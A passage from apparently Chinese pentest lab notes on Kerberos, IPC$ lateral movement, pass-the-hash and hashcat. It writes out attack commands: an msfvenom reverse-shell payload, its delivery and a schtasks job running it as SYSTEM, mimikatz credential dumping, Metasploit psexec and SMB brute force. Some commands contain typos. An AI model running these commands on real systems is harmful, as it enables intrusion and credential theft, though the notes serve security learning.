<h3 id="具体流程"><a href="#具体流程" class="headerlink" title="具体流程"></a>具体流程</h3><h4 id="Client-向KDC-AS申请TGT"><a href="#Client-向KDC-AS申请TGT" class="headerlink" title="Client 向KDC-AS申请TGT"></a>Client 向KDC-AS申请TGT</h4><h5 id="Client-gt-KDC-AS-AS-REQ"><a href="#Client-gt-KDC-AS-AS-REQ" class="headerlink" title="Client -&gt; KDC-AS (AS_REQ)"></a>Client -&gt; KDC-AS (AS_REQ)</h5><p>发送AS_REQ：(被Client加密的时间戳, 客户端信息, 服务器端信息)</p>
<p>KDC-AS进行认证 看是否在白名单中</p>
<h5 id="KDC-AS-gt-Client-AS-REP"><a href="#KDC-AS-gt-Client-AS-REP" class="headerlink" title="KDC-AS -&gt; Client(AS_REP)"></a>KDC-AS -&gt; Client(AS_REP)</h5><p>如果认证通过，AS会随机生成一个字符串 <strong>Sessionkey</strong></p>
<p>发送两条消息</p>
<p>T(C)   Client Pass Hash(SessionKey)  ,用于后续与TGS服务通信</p>
<pre><code>发送 SessionKey 
</code></pre>
<p>TGT   KDC Pass Hash(SessionKey, Client信息) ，作为向TGS申请票据的凭证</p>
<pre><code>发送 SessionKey Client信息 结束时间
</code></pre>
<h4 id="Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket"><a href="#Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket" class="headerlink" title="Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket"></a>Client得到TGT后，向KDC请求访问server的权限。通过Client得到的TGT判断是否可以拥有访问Server的权限，如果可以就给Client访问Server权限的ticket</h4><h5 id="Client-gt-KDC-TGS-TGS-REQ"><a href="#Client-gt-KDC-TGS-TGS-REQ" class="headerlink" title="Client -&gt; KDC-TGS (TGS_REQ)"></a>Client -&gt; KDC-TGS (TGS_REQ)</h5><p>客户端使用NTLM Hash解密T(C) 得到<strong>SessionKey</strong></p>
<p>Client 向 TGS 发送消息</p>
<pre><code>TGT

SessionKey(Client信息,时间戳) 可以记作认证因子，使用SessionKey进行加密

Client信息

Server信息
</code></pre>
<h5 id="KDC-TGS-gt-Client-TGS-REP"><a href="#KDC-TGS-gt-Client-TGS-REP" class="headerlink" title="KDC-TGS -&gt; Client(TGS_REP)"></a>KDC-TGS -&gt; Client(TGS_REP)</h5><p>KDC使用NTLMHash解密 TGT 得到 (SessionKey，Client信息，结束时间)</p>
<p>然后使用SessionKey解密 认证因子 得到(Client信息，时间戳)</p>
<p>校验 时间戳与当前时间 和解密TGT后的Client信息与SessionKey解密后的Client信息</p>
<p>校验通过后，会判断客户端有没有权限访问服务端    </p>
<p>认证通过后，KDC 会生成ServerSessionKey(随机生成)</p>
<p>发送RGS_REP:</p>
<p>SessionKey(ServerSessionKey, Client信息，票据到期时间)  （使用SessionKey加密的ServerSessionKey ）</p>
<p>ST (ServerSessionKey, 客户信息 ，票据到期时间)  </p>
<p>票据到期时间可以理解成TGS生命周期</p>
<h4 id="Client得到ST后，可以访问server"><a href="#Client得到ST后，可以访问server" class="headerlink" title="Client得到ST后，可以访问server"></a>Client得到ST后，可以访问server</h4><p>Client 收到信息后，使⽤Session Key解密获得 (ServerSessionKey, Client信息，TGS生命周期）</p>
<h5 id="Client-gt-Server-AP-REQ"><a href="#Client-gt-Server-AP-REQ" class="headerlink" title="Client -&gt; Server (AP-REQ)"></a>Client -&gt; Server (AP-REQ)</h5><p>发送AP-REQ:</p>
<pre><code>ST

ServerSessionKey(客户信息, 票据到期时间) 记作认证因子2，使用ServerSessionKey加密
</code></pre>
<h5 id="Server-gt-Client-AP-REP"><a href="#Server-gt-Client-AP-REP" class="headerlink" title="Server -&gt; Client(AP-REP)"></a>Server -&gt; Client(AP-REP)</h5><p>Server使用NTLM Hash解密ST 得到 (ServerSessionKey,  Client信息，票据到期时间)</p>
<p>用ServerSessionKey解密认证因子2 得到 (Client信息，票据到期时间)</p>
<p>然后再校验时间戳和Client信息</p>
<p>校验通过后，客户端即可访问服务端</p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>常用Windows远程连接和相关命令</title>
    <url>/posts/9527b68a/</url>
    <content><![CDATA[<h3 id="IPC-共享连接"><a href="#IPC-共享连接" class="headerlink" title="IPC$共享连接"></a>IPC$共享连接</h3><p>IPC$ （Internet Process Connection) 共享”命名管道”的资源，为实现进程间通信而开放的通道。使用该命令可以与目标主机建立连接，建立连接后可以访问目标主机的文件，进行下载、上传、命令执行等操作。</p>
<br>

<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><ul>
<li>目标主机开启139，445端口</li>
<li>目标主机管理员开启<code>IPC$</code>默认共享服务</li>
<li>知道目标主机的账号密码</li>
</ul>
<br>

<h4 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a>操作命令</h4><h5 id="查看Windows默认开启的共享"><a href="#查看Windows默认开启的共享" class="headerlink" title="查看Windows默认开启的共享"></a>查看Windows默认开启的共享</h5><p><code>net share</code> </p>
<h5 id="查看当前主机所建立的连接"><a href="#查看当前主机所建立的连接" class="headerlink" title="查看当前主机所建立的连接"></a>查看当前主机所建立的连接</h5><p><code>net use</code></p>
<h4 id="确定主机时间"><a href="#确定主机时间" class="headerlink" title="确定主机时间"></a>确定主机时间</h4><p><code>net time \\ip </code></p>
<h4 id="开启-关闭IPC-共享"><a href="#开启-关闭IPC-共享" class="headerlink" title="开启/关闭IPC$共享"></a>开启/关闭IPC$共享</h4><p><code>net share ipc$</code> </p>
<p><code>net share ipc$ /del</code></p>
<h5 id="建立空连接"><a href="#建立空连接" class="headerlink" title="建立空连接"></a>建立空连接</h5><p><code>net use \\127.0.0.1\ipc$  &quot;&quot;  /user:&quot;&quot; </code></p>
<h5 id="建立完整的用户名-密码IPC-连接"><a href="#建立完整的用户名-密码IPC-连接" class="headerlink" title="建立完整的用户名 密码IPC$连接"></a>建立完整的用户名 密码IPC$连接</h5><p><code>net use \\10.10.0.164\ipc$ &quot;password&quot;  /user:&quot;username&quot; </code></p>
<h5 id="删除IPC-连接"><a href="#删除IPC-连接" class="headerlink" title="删除IPC$连接"></a>删除IPC$连接</h5><p><code>net use \\127.0.0.1\ipc$ /del</code></p>
<h5 id="路径映射"><a href="#路径映射" class="headerlink" title="路径映射"></a>路径映射</h5><p><code>net use z: \\10.10.0.164\c$  &quot;password&quot; /user:&quot;username&quot; </code> 把目标主机的c盘映射到本地主机的z盘(没有建立ipc连接情况下)</p>
<p><code>net use z: \\10.10.0.164\c$</code>（已经建立ipc连接的情况下）</p>
<p><img src="/posts/9527b68a/yingshe.png"></p>
<h5 id="删除映射的z盘"><a href="#删除映射的z盘" class="headerlink" title="删除映射的z盘"></a>删除映射的z盘</h5><p><code>net use z: /del </code></p>
<h5 id="删除全部"><a href="#删除全部" class="headerlink" title="删除全部"></a>删除全部</h5><p><code>net use * /del</code></p>
<h5 id="使用dir查看目标机器目录"><a href="#使用dir查看目标机器目录" class="headerlink" title="使用dir查看目标机器目录"></a>使用dir查看目标机器目录</h5><p><code>dir \\10.10.0.164\c$</code></p>
<p><img src="/posts/9527b68a/dir.png"></p>
<h5 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h5><p><code>copy test.txt \\10.10.0.164\c$</code> 将test.txt复制到目标主机的c盘</p>
<h5 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h5><p><code>copy \\10.10.0.164\c$\test.txt </code></p>
<h4 id="使用at命令创建计划任务"><a href="#使用at命令创建计划任务" class="headerlink" title="使用at命令创建计划任务"></a>使用at命令创建计划任务</h4><p><code>at \\&lt;目标主机ip&gt; &lt;启动时间&gt; &lt;木马所在位置&gt;</code></p>
<p><code>at \\10.10.0.164  </code></p>
<p>删除id为1的计划任务</p>
<p><code>at \\10.10.0.164 1 /delete</code></p>
<h4 id="使用type读取文件"><a href="#使用type读取文件" class="headerlink" title="使用type读取文件"></a>使用type读取文件</h4><p><code>type \\10.10.0.164\c$\1.txt </code>  读取目标机器的1.txt文件</p>
<br>

<br>

<h4 id="实例1"><a href="#实例1" class="headerlink" title="实例1"></a>实例1</h4><p>win7  攻击机  </p>
<p>win2012 目标机   10.10.0.164</p>
<br>

<p>使用win7与目标机建立ipc连接</p>
<p><code>net use  \\10.10.0.164\ipc$ &quot;admin123!&quot; /user:&quot;administartor&quot; </code></p>
<p>查看目标机器的时间</p>
<p><code>net time \\10.10.0.164 </code></p>
<p>使用dir读取目标机器c盘的文件</p>
<p><code>dir \\10.10.0.164\c$ </code></p>
<p>使用type读取目标主机c盘下的1.txt</p>
<p><code>type \\10.10.0.164\c$\1.txt</code></p>
<p>选择将目标主机的c盘映射到本地z盘</p>
<p><code>net use z: \\10.10.0.164\c$ </code></p>
<p>在建立ipc连接后利用Psexec反弹cmd</p>
<p><code>Psexec.exe \\10.10.0.164 -s cmd.exe -acceptcula</code></p>
<p><img src="/posts/9527b68a/Psexec_cmd.png"> </p>
<p>删除映射的z盘</p>
<p><code>net use z: /del </code></p>
<p>删除ipc$连接</p>
<p><code>net use \\10.10.0.164\ipc$ /del</code></p>
<p>删除全部</p>
<p><code>net use * /del </code></p>
<br>

<h3 id="IPC-计划任务进行横向渗透"><a href="#IPC-计划任务进行横向渗透" class="headerlink" title="IPC+计划任务进行横向渗透"></a>IPC+计划任务进行横向渗透</h3><h4 id="使用schtasks命令"><a href="#使用schtasks命令" class="headerlink" title="使用schtasks命令"></a>使用schtasks命令</h4><p>利用流程</p>
<ol>
<li>与目标建立IPC连接</li>
<li>使用copy命令将木马、命令脚本复制到目标机器</li>
<li>目标机器创建计划任务，使其自动触发木马、脚本</li>
<li>删除IPC连接</li>
</ol>
<p>环境</p>
<pre><code>攻击机  192.168.0.128 (kali)

目标机  192.168.0.164 (Win2012）

跳板机  192.168.0.157 (WIn2008)
</code></pre>
<br>

<h5 id="跳板机与目标机建立IPC连接"><a href="#跳板机与目标机建立IPC连接" class="headerlink" title="跳板机与目标机建立IPC连接"></a>跳板机与目标机建立IPC连接</h5><p><code>net use \\192.168.0.164\ipc$ &quot;password&quot; /user:&quot;administrator&quot;</code></p>
<h5 id="kali上生成木马"><a href="#kali上生成木马" class="headerlink" title="kali上生成木马"></a>kali上生成木马</h5><p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.0.157 lport=8888 -f exe &gt; shell.exe</code></p>
<h4 id="将shell-exe传到跳转机上"><a href="#将shell-exe传到跳转机上" class="headerlink" title="将shell.exe传到跳转机上"></a>将shell.exe传到跳转机上</h4><p>在kali上开启一个http服务</p>
<p><code>python3 -m http.server 9999</code></p>
<p>在跳转机上访问并下载shell.exe</p>
<h5 id="在跳转机上使用copy命令将shell-exe复制到目标机"><a href="#在跳转机上使用copy命令将shell-exe复制到目标机" class="headerlink" title="在跳转机上使用copy命令将shell.exe复制到目标机"></a>在跳转机上使用copy命令将shell.exe复制到目标机</h5><p><code>copy shell.exe \\192.168.0.164\c$</code></p>
<p><img src="/posts/9527b68a/schtasks_dir.png"></p>
<h5 id="利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell-exe"><a href="#利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell-exe" class="headerlink" title="利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell.exe"></a>利用schtasks创建一个名为shell的计划命令，该命令每分钟执行一次shell.exe</h5><p><code>schtasks /create /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn shell /sc minute /mo 1 /tr  c:\shell.exe /ru sysytem /f</code></p>
<p><img src="/posts/9527b68a/schtasks1.png"></p>
<p>使用nc监听win2008跳转机的8888端口</p>
<p><img src="/posts/9527b68a/schtasks_nc.png"></p>
<h5 id="利用schtasks-执行命令，使用type读取文件内容"><a href="#利用schtasks-执行命令，使用type读取文件内容" class="headerlink" title="利用schtasks 执行命令，使用type读取文件内容"></a>利用schtasks 执行命令，使用type读取文件内容</h5><p><code>schtasjs /create /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn test /sc minute /mo 1 /tr &quot;c:\cmd.exe /c &#39;ipconfig &gt; c:\result.txt&#39;&quot;  /ru system /f</code></p>
<p><img src="/posts/9527b68a/schtasks2.PNG"></p>
<p>查看是否生成result.txt</p>
<p><code>dir \\192.168.0.164\c$</code></p>
<p><img src="/posts/9527b68a/schtasks_dir2.png"></p>
<p>查看result.txt的内容</p>
<p><code>type \\192.168.0.164\c$\result.txt</code></p>
<p><img src="/posts/9527b68a/result.png"></p>
<h5 id="schtasks-删除计划任务"><a href="#schtasks-删除计划任务" class="headerlink" title="schtasks 删除计划任务"></a>schtasks 删除计划任务</h5><p><code>schtasks /Delete /s 192.168.0.164 /u &quot;administrator&quot; /p &quot;admin123!&quot; /tn test /f</code></p>
<p><img src="/posts/9527b68a/schtasks_delete.png"></p>
<h5 id="断开ipc-连接"><a href="#断开ipc-连接" class="headerlink" title="断开ipc$连接"></a>断开ipc$连接</h5><p><code>net use \\192.168.0.164\ipc$ /del  </code></p>
<h5 id="schtasks-参数"><a href="#schtasks-参数" class="headerlink" title="schtasks 参数"></a>schtasks 参数</h5><blockquote>
<p>S [目标主机]<br>/U [目标用户名]<br>/P [目标密码]<br>/TN [任务名称]<br>/TR [执行程序]<br>/SC [执行方式，once为执行1次]<br>/ST [定时计划执行时间]<br>/f  [默认为Y，不进行回显交互，直接运行]<br>/i  [显示程序窗口交互]</p>
</blockquote>
<h4 id="使用at命令"><a href="#使用at命令" class="headerlink" title="使用at命令"></a>使用at命令</h4><p>at命令和schtasks命令类似</p>
<p>注意: Windows Server 2012 以后的版本没有at命令，只有schtasks命令<br>所以在这里使用win7 代替之前使用的win2012<br>环境<br>win7  192.168.0.129<br>win2008 192.168.0.157</p>
<h5 id="与建立目标机器建立IPC连接"><a href="#与建立目标机器建立IPC连接" class="headerlink" title="与建立目标机器建立IPC连接"></a>与建立目标机器建立IPC连接</h5><p><code>net use \\192.168.0.157\ipc$ &quot;admin123!&quot; /user:&quot;administrator&quot;  </code></p>
<h5 id="在跳转机上使用copy命令将shell2-exe复制到目标机"><a href="#在跳转机上使用copy命令将shell2-exe复制到目标机" class="headerlink" title="在跳转机上使用copy命令将shell2.exe复制到目标机"></a>在跳转机上使用copy命令将shell2.exe复制到目标机</h5><p><code>copy shell2.exe \\192.168.0.157\c$</code></p>
<h5 id="使用at命令创建计划任务-1"><a href="#使用at命令创建计划任务-1" class="headerlink" title="使用at命令创建计划任务"></a>使用at命令创建计划任务</h5><p>查看目标机器时间</p>
<p><code>net time \\192.168.0.157 </code> 这里的时间可能与本地不符合</p>
<p><code>at \\192.168.0.157 2:13:00 c:\shell2.exe</code> </p>
<p><img src="/posts/9527b68a/at_shell2.png"></p>
<h5 id="查看任务列表"><a href="#查看任务列表" class="headerlink" title="查看任务列表"></a>查看任务列表</h5><p><code>at \\192.168.0.157 </code><br><img src="/posts/9527b68a/at_shell3.png"></p>
<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.secrss.com/articles/26810">https://www.secrss.com/articles/26810</a></p>
<p><a href="http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS">http://t3ngyu.leanote.com/post/LM-AT-SCHTASKS</a></p>
<p><a href="https://www.cnblogs.com/mindzone/p/14293851.html">https://www.cnblogs.com/mindzone/p/14293851.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Hashpth</title>
    <url>/posts/350b40a4/</url>
    <content><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>PASS The Hash 也叫Hash传递攻击，简称 PTH。用户登录可以不需要明文密码只需要获取到Hash 就可以登录目标系统。</p>
<p>在域中，用户登录的账号密码大都是相同的，所以攻击者可以通过Hash传递来尝试登录内网的其他计算机.通过使用哈希传递攻击，攻击者不需要破解密码散列值</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在windows系统中，通常会使用NTLM进行身份验证，在使用NTLM做身份验证时，不会使用明文密码作为身份验证，而是使用明文密码加密过的Hash值作为身份验证的凭据。攻击者可以直接通过LM Hash 和NTLM Hash 访问远程主机或服务，而不需要提供明文密码。</p>
<h3 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h3><ul>
<li><p>获取一台域主机的高（admin或者system）权限</p>
</li>
<li><p>利用mimikatz等工具导出hash</p>
</li>
<li><p>利用导出的hash尝试登录其他的域内主机</p>
</li>
</ul>
<h3 id="hash-pth攻击"><a href="#hash-pth攻击" class="headerlink" title="hash pth攻击"></a>hash pth攻击</h3><h4 id="使用mimikatz-进行pth"><a href="#使用mimikatz-进行pth" class="headerlink" title="使用mimikatz 进行pth"></a>使用mimikatz 进行pth</h4><p>在Windows Server 2012中打开mimikatz  </p>
<p><code>privilege::debug</code></p>
<p><code>sekurlsa::msv</code></p>
<p><img src="/posts/350b40a4/msv.png"></p>
<p>得到hash值为  <code>4cb55ea6471d29ccbb2ce4cf00271fe3</code></p>
<p>但是在这里如果选择直接复制mimikatz中的信息的话，程序会直接卡死，所以可以选择开启日志 <code>log</code></p>
<p><code>privilege::debug</code></p>
<p><code>sekurlsa::pth /user:Administrator /domain:mamor /ntlm:32ed87bdb5fdc5e9cba88547376818d4</code></p>
<p><img src="/posts/350b40a4/pth.png"></p>
<p>运行完命令会弹出cmd.exe</p>
<p><img src="/posts/350b40a4/pth2.png"></p>
<p>成功访问到域内的另一台相同密码的机器的C盘</p>
<p><img src="/posts/350b40a4/pth_cmd.png"></p>
<p>对于安装KB2871991补丁后的机器，无法使用常规的哈希传递进行横向移动，但是对于Administrator（SID为500的账号）的散列值仍可以进行哈希传递。也就是说只要SID为500的账号进行横向渗透时不会被该补丁所影响。</p>
<h4 id="利用wmiexec-py进行pth攻击"><a href="#利用wmiexec-py进行pth攻击" class="headerlink" title="利用wmiexec.py进行pth攻击"></a>利用wmiexec.py进行pth攻击</h4><p>下载地址：<a href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
<br>

<h4 id="使用msf中的模块进行pth攻击"><a href="#使用msf中的模块进行pth攻击" class="headerlink" title="使用msf中的模块进行pth攻击"></a>使用msf中的模块进行pth攻击</h4><h4 id="Psexec"><a href="#Psexec" class="headerlink" title="Psexec"></a>Psexec</h4><p>环境：</p>
<p>Windows2012  192.168.0.161 10.10.0.161</p>
<p>kali  192.168.0.128</p>
<p>条件 ：</p>
<ol>
<li>开启445端口SMB服务（默认开启）</li>
<li>开启admin$共享</li>
</ol>
<p>**<a href="https://asecuritysite.com/encryption/lmhash">https://asecuritysite.com/encryption/lmhash</a> **</p>
<p>可以将密码转换为LM-Hash 和 NTLM-Hash (LMHASH:NTHASH 格式) </p>
<p>利用：</p>
<p>use exploit/windows/smb/psexec<br>set RHOSTS 192.168.0.161<br>set payload windows/meterpreter/reverse_tcp（默认payload）<br>set LPORT 4444<br>set LHOST 192.168.0.128<br>set SMBUSER Administrator<br>set SMBPASS admin123!        （设置密码明文或者hash值 来进行pth）<br>set SMBDomain mamor<br>exploit</p>
<p><img src="/posts/350b40a4/msf_psexec.png"></p>
<h5 id="SMB-pth攻击"><a href="#SMB-pth攻击" class="headerlink" title="SMB pth攻击"></a>SMB pth攻击</h5><p>Metasploit有一个auxiliary辅助模块，可以通过SMB登录到网络中。这个模块需要用户名和hash字典，将收集的用户名和hash制作成了字典，去爆破有效的用户名和hash组合。当然如果有用户名 密码的字典也可以使用此模块进行爆破</p>
<p><code>use auxiliary/scanner/smb/smb_login</code></p>
<p><code>set rhosts 192.168.0.157</code><br><code>set user_file /home/kali/Common/user.txt</code><br><code>set pass_file /home/kali/Common/password.txt</code><br><code>set smbdomain mamor</code><br><code>exploit</code></p>
<p><img src="/posts/350b40a4/smb_pth1.png"></p>
<p><img src="/posts/350b40a4/smb_pth2.png"></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="http://www.feidao.site/wordpress/?p=2084">http://www.feidao.site/wordpress/?p=2084</a></p>
<p><a href="https://www.cnblogs.com/zzjdbk/p/14507846.html">https://www.cnblogs.com/zzjdbk/p/14507846.html</a></p>
<p><a href="https://yoga7xm.top/2019/04/12/IPentest-domain3/">https://yoga7xm.top/2019/04/12/IPentest-domain3/</a></p>
<p><a href="https://blog.csdn.net/zzlx123/article/details/103595197">https://blog.csdn.net/zzlx123/article/details/103595197</a></p>
</blockquote>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Hashcat使用</title>
    <url>/posts/de6bd435/</url>
    <content><![CDATA[<p>Hashcat –help 参看hashcat 帮助文档 </p>
<br>

<p>-m  表示散列算法类型</p>
<p>-m 1000 （NTLM）</p>
<p><img src="/posts/de6bd435/Hash_modes.png"></p>
<p>-a  指定破解模式，常用 straight 字典破解 和 brute-force 暴力破解</p>
<blockquote>
<p>0 = Straight        //字典破解</p>
<p>1 = Combination        //组合破解</p>
<p>3 = Brute-force        //掩码暴力破解</p>
<p>6 = Hybrid Wordlist + Mask        </p>
<p>7 = Hybrid Mask + Wordlist</p>
<p>9 = Association</p>
</blockquote>
<p><img src="/posts/de6bd435/Hash_Attack.png"></p>
<br>

<h4 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h4><p><code>hashcat -a 0 -m xx &lt;hashfile&gt; &lt;zidian1&gt; &lt;zidian2&gt;</code></p>
<blockquote>
<p>-m                           指定哈希类型</p>
<p>-a                            指定破解模式</p>
<p>-V                            查看版本信息</p>
<p>-o                            将输出结果储存到指定文件</p>
<p>–force                     忽略警告</p>
<p>–show                    仅显示破解的hash密码和对应的明文</p>
<p>–remove                 从源文件中删除破解成功的hash</p>
<p>–username             忽略hash表中的用户名</p>
<p>-b                             测试计算机破解速度和相关硬件信息</p>
<p>-O                            限制密码长度</p>
<p>-T                            设置线程数</p>
<p>-r                             使用规则文件</p>
<p>-1                             自定义字符集  -1 0123asd     ?1={0123asd}</p>
<p>-2                             自定义字符集  -2 0123asd    ?2={0123asd}</p>
<p>-3                             自定义字符集  -3 0123asd    ?3={0123asd}</p>
<p>-i                              启用增量破解模式</p>
<p>–increment-min       设置密码最小长度</p>
<p>–increment-max      设置密码最大长度</p>
</blockquote>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows用户密码加密方法与破解</title>
    <url>/posts/11da9eaf/</url>
    <content><![CDATA[<br>

<h3 id="Windows-Hash"><a href="#Windows-Hash" class="headerlink" title="Windows Hash"></a>Windows Hash</h3><h4 id="LM-Hash"><a href="#LM-Hash" class="headerlink" title="LM Hash"></a>LM Hash</h4><p>LAN Manager (LM) Hash 时WIndows 系统所用的第一种密码哈希算法，本质为DES加密</p>
<h5 id="LM-Hash-生成原理"><a href="#LM-Hash-生成原理" class="headerlink" title="LM Hash 生成原理"></a>LM Hash 生成原理</h5><ul>
<li><p>1.用户密码转换为大写，最大长度限制为14个字符，</p>
</li>
<li><p>2.密码转换为16进制字符串，不足14个字节将用0来补全</p>
</li>
<li><p>3.密码的16进制被分成两个7byte部分，每部分转换成比特流，并且长度为为56bit，长度不足则在左边用0补齐</p>
</li>
<li><p>4.再分为7bit为一组，每组末尾加0，再组成一组</p>
</li>
<li><p>5.将以上步骤得到的两组8字节编码，分别作为DES加密key为魔术字符串“KGS!@#$% ”进行加密</p>
</li>
</ul>
<br>

<p>参考<a href="https://blog.csdn.net/endeav_or/article/details/50196325">https://blog.csdn.net/endeav_or/article/details/50196325</a></p>
<p>以这篇文字给出的 123994 为例</p>
<p>将 123994 使用文本编辑器 转换为十六进制 </p>
<p><img src="/posts/11da9eaf/LM-Hash1.png"></p>
<p>转换后 为 <code>313233393934</code> (12*4 bits) 而为了满足14字节(14 * 8 bits) 后续全都用0补全</p>
<p>所以 补全后的十六进制为 <code>3132333939340000 0000000000000000</code></p>
<p>将以上编码分词2组7字节(7*8 bits)   <code>3132333939340000</code>  <code>0000000000000000</code></p>
<p>将以上两组7字节的十六进制转换为 二进制，每7bit 一组末尾加0，再转换为十六进制组成的两组8字节的编码</p>
<p><code>31323339393400</code> 转换为 二进制位</p>
<p><code>00110001001100100011001100111001001110010011010000000000</code> 长度不足便在左边补0 这里从计算器复制过来没有前面两个0</p>
<p><code>0011000  1001100  1000110  0110011  1001001  1100100  1101000 0000000</code> 每7位分为一组</p>
<p><code>00110000  10011000  10001100  01100110  10010010  11001000  11010000 00000000 </code>  每一组末尾补0</p>
<p>将每一组转换位十六进制</p>
<p><code>00110000  10011000  1000110 001100110  10010010  11001000  11010000 00000000 </code></p>
<p><code>30       98        8C        66        92         C8        D0        00 </code></p>
<p>最终得到 <code>30988C6692C8D000</code>  同理 <code>00000000000000</code> (14个0 ) 得到 <code>0000000000000000</code>(16个0)</p>
<p>最后再将 以上两组8字节编码 分别作为DES 加密的密钥 为 魔术字符串“KGS!@#$% ”进行加密</p>
<p>该魔术字符串转换为16进制为 <code>4B47532140232425</code></p>
<p><img src="/posts/11da9eaf/KGS.png"></p>
<p>将两组DES加密后的编码拼接，<br>得到最终LM-Hash值为：<br>FAE8BB9ECB799902 AAD3B435B51404EE</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python实现LM-HASH脚本</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Des_Key</span>):</span></span><br><span class="line">    k = des(Des_Key, ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Zero_padding</span>(<span class="params"><span class="built_in">str</span></span>):</span></span><br><span class="line">    b = []</span><br><span class="line">    l = <span class="built_in">len</span>(<span class="built_in">str</span>)</span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">        <span class="keyword">if</span> (num &lt; <span class="number">8</span>) <span class="keyword">and</span> n % <span class="number">7</span> == <span class="number">0</span>:</span><br><span class="line">            b.append(<span class="built_in">str</span>[n:n + <span class="number">7</span>] + <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">            num = num + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(b)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    test_str = <span class="string">&quot;123994&quot;</span></span><br><span class="line">    <span class="comment"># 用户的密码转换为大写,并转换为16进制字符串</span></span><br><span class="line">    test_str = test_str.upper().encode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">    str_len = <span class="built_in">len</span>(test_str)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 密码不足14字节将会用0来补全</span></span><br><span class="line">    <span class="keyword">if</span> str_len &lt; <span class="number">28</span>:</span><br><span class="line">        test_str = test_str.ljust(<span class="number">28</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 固定长度的密码被分成两个7byte部分</span></span><br><span class="line">    t_1 = test_str[<span class="number">0</span>:<span class="built_in">len</span>(test_str) / <span class="number">2</span>]</span><br><span class="line">    t_2 = test_str[<span class="built_in">len</span>(test_str) / <span class="number">2</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span></span><br><span class="line">    t_1 = <span class="built_in">bin</span>(<span class="built_in">int</span>(t_1, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">    t_2 = <span class="built_in">bin</span>(<span class="built_in">int</span>(t_2, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 再分7bit为一组末尾加0，组成新的编码</span></span><br><span class="line">    t_1 = Zero_padding(t_1)</span><br><span class="line">    t_2 = Zero_padding(t_2)</span><br><span class="line">    <span class="built_in">print</span> t_1</span><br><span class="line">    t_1 = <span class="built_in">hex</span>(<span class="built_in">int</span>(t_1, <span class="number">2</span>))</span><br><span class="line">    t_2 = <span class="built_in">hex</span>(<span class="built_in">int</span>(t_2, <span class="number">2</span>))</span><br><span class="line">    t_1 = t_1[<span class="number">2</span>:].rstrip(<span class="string">&#x27;L&#x27;</span>)</span><br><span class="line">    t_2 = t_2[<span 